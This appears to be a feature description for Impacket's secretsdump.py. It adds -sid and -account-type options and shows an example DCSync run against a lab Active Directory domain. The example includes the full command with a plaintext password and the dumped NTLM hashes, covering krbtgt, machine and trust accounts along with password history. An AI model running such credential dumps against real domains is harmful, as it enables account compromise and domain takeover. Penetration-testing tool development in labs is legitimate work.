Update secretsdump.py
========

New flags (for LOCAL, VSS and DRSUAPI methods get credentials from ntds.dit):
- -sid - Replace RID to SID
- -account-type - Display account type (User, Machine, Trust)

```
secretsdump.py essos.local/'daenerys.targaryen':'BurnThemAll!'@meereen.essos.local -history -user-status -pwd-last-set -just-dc-ntlm -sid -account-type -outputfile essos_dcsync.local
```
```
Output >
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:S-1-5-21-1614210445-3434418105-4037753173-500:aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da:::(pwdLastSet=2022-12-10 21:42)(status=Enabled)(accountType=User)
Guest:S-1-5-21-1614210445-3434418105-4037753173-501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::(pwdLastSet=never)(status=Disabled)(accountType=User)
krbtgt:S-1-5-21-1614210445-3434418105-4037753173-502:aad3b435b51404eeaad3b435b51404ee:96c131bf604cfdaf08e7a1dd8add1512:::(pwdLastSet=2022-12-10 21:58)(status=Disabled)(accountType=User)
DefaultAccount:S-1-5-21-1614210445-3434418105-4037753173-503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::(pwdLastSet=never)(status=Disabled)(accountType=User)
vagrant:S-1-5-21-1614210445-3434418105-4037753173-1000:aad3b435b51404eeaad3b435b51404ee:cea7f7da2b7ed3d2f7bb18d73ceae8b8:::(pwdLastSet=2023-08-17 11:54)(status=Enabled)(accountType=User)
vagrant_history0:S-1-5-21-1614210445-3434418105-4037753173-1000:aad3b435b51404eeaad3b435b51404ee:cea7f7da2b7ed3d2f7bb18d73ceae8b8:::(status=Enabled)(accountType=User)
daenerys.targaryen:S-1-5-21-1614210445-3434418105-4037753173-1110:aad3b435b51404eeaad3b435b51404ee:34534854d33b398b66684072224bb47a:::(pwdLastSet=2023-03-31 21:34)(status=Enabled)(accountType=User)
daenerys.targaryen_history0:S-1-5-21-1614210445-3434418105-4037753173-1110:aad3b435b51404eeaad3b435b51404ee:34534854d33b398b66684072224bb47a:::(status=Enabled)(accountType=User)
daenerys.targaryen_history1:S-1-5-21-1614210445-3434418105-4037753173-1110:aad3b435b51404eeaad3b435b51404ee:34534854d33b398b66684072224bb47a:::(status=Enabled)(accountType=User)
daenerys.targaryen_history2:S-1-5-21-1614210445-3434418105-4037753173-1110:aad3b435b51404eeaad3b435b51404ee:34534854d33b398b66684072224bb47a:::(status=Enabled)(accountType=User)
daenerys.targaryen_history3:S-1-5-21-1614210445-3434418105-4037753173-1110:aad3b435b51404eeaad3b435b51404ee:34534854d33b398b66684072224bb47a:::(status=Enabled)(accountType=User)
viserys.targaryen:S-1-5-21-1614210445-3434418105-4037753173-1111:aad3b435b51404eeaad3b435b51404ee:d96a55df6bef5e0b4d6d956088036097:::(pwdLastSet=2023-03-31 21:35)(status=Enabled)(accountType=User)
viserys.targaryen_history0:S-1-5-21-1614210445-3434418105-4037753173-1111:aad3b435b51404eeaad3b435b51404ee:d96a55df6bef5e0b4d6d956088036097:::(status=Enabled)(accountType=User)
viserys.targaryen_history1:S-1-5-21-1614210445-3434418105-4037753173-1111:aad3b435b51404eeaad3b435b51404ee:d96a55df6bef5e0b4d6d956088036097:::(status=Enabled)(accountType=User)
viserys.targaryen_history2:S-1-5-21-1614210445-3434418105-4037753173-1111:aad3b435b51404eeaad3b435b51404ee:d96a55df6bef5e0b4d6d956088036097:::(status=Enabled)(accountType=User)
viserys.targaryen_history3:S-1-5-21-1614210445-3434418105-4037753173-1111:aad3b435b51404eeaad3b435b51404ee:d96a55df6bef5e0b4d6d956088036097:::(status=Enabled)(accountType=User)
MEEREEN$:S-1-5-21-1614210445-3434418105-4037753173-1001:aad3b435b51404eeaad3b435b51404ee:831c571894affebcd446fae6b275811c:::(pwdLastSet=2023-11-04 15:50)(status=Enabled)(accountType=Machine)
MEEREEN$_history0:S-1-5-21-1614210445-3434418105-4037753173-1001:aad3b435b51404eeaad3b435b51404ee:d741ac144c32851371a771c329ef498c:::(status=Enabled)(accountType=Machine)
MEEREEN$_history1:S-1-5-21-1614210445-3434418105-4037753173-1001:aad3b435b51404eeaad3b435b51404ee:aef466f8956b8cb06a24df6b0cdab941:::(status=Enabled)(accountType=Machine)
MEEREEN$_history2:S-1-5-21-1614210445-3434418105-4037753173-1001:aad3b435b51404eeaad3b435b51404ee:f05e1da8c5419cf3313c757c205faeec:::(status=Enabled)(accountType=Machine)
BRAAVOS$:S-1-5-21-1614210445-3434418105-4037753173-1104:aad3b435b51404eeaad3b435b51404ee:1abab8cbb18743c71f2a7a0d91948f2b:::(pwdLastSet=2023-09-09 19:08)(status=Enabled)(accountType=Machine)
BRAAVOS$_history0:S-1-5-21-1614210445-3434418105-4037753173-1104:aad3b435b51404eeaad3b435b51404ee:df5a4fc8351451ae90fb501b978135f3:::(status=Enabled)(accountType=Machine)
BRAAVOS$_history1:S-1-5-21-1614210445-3434418105-4037753173-1104:aad3b435b51404eeaad3b435b51404ee:e9ce222d52242e2cddc3e19418307b9c:::(status=Enabled)(accountType=Machine)
BRAAVOS$_history2:S-1-5-21-1614210445-3434418105-4037753173-1104:aad3b435b51404eeaad3b435b51404ee:be74168d4d779b897552f6a14a869bf7:::(status=Enabled)(accountType=Machine)
ASTAPOR$:S-1-5-21-1614210445-3434418105-4037753173-2602:aad3b435b51404eeaad3b435b51404ee:4302152fd1b444fa37a5ced9f4f5d006:::(pwdLastSet=2023-09-15 21:20)(status=Enabled)(accountType=Machine)
ASTAPOR$_history0:S-1-5-21-1614210445-3434418105-4037753173-2602:aad3b435b51404eeaad3b435b51404ee:ba1b7e8ca214e8f670bd8cba695d5478:::(status=Enabled)(accountType=Machine)
SEVENKINGDOMS$:S-1-5-21-1614210445-3434418105-4037753173-1105:aad3b435b51404eeaad3b435b51404ee:7fa6b52eb00811d2e02da04f269d9353:::(pwdLastSet=2023-08-04 10:27)(status=Enabled)(accountType=Trust)
SEVENKINGDOMS$_history0:S-1-5-21-1614210445-3434418105-4037753173-1105:aad3b435b51404eeaad3b435b51404ee:7fa6b52eb00811d2e02da04f269d9353:::(status=Enabled)(accountType=Trust)
SEVENKINGDOMS$_history1:S-1-5-21-1614210445-3434418105-4037753173-1105:aad3b435b51404eeaad3b435b51404ee:ee91a5854bd0e83685e7c84ca0fc497c:::(status=Enabled)(accountType=Trust)
SEVENKINGDOMS$_history2:S-1-5-21-1614210445-3434418105-4037753173-1105:aad3b435b51404eeaad3b435b51404ee:ee91a5854bd0e83685e7c84ca0fc497c:::(status=Enabled)(accountType=Trust)
SEVENKINGDOMS$_history3:S-1-5-21-1614210445-3434418105-4037753173-1105:aad3b435b51404eeaad3b435b51404ee:1de8088e4e3ee094d12d3a6c32c024f9:::(status=Enabled)(accountType=Trust)
```
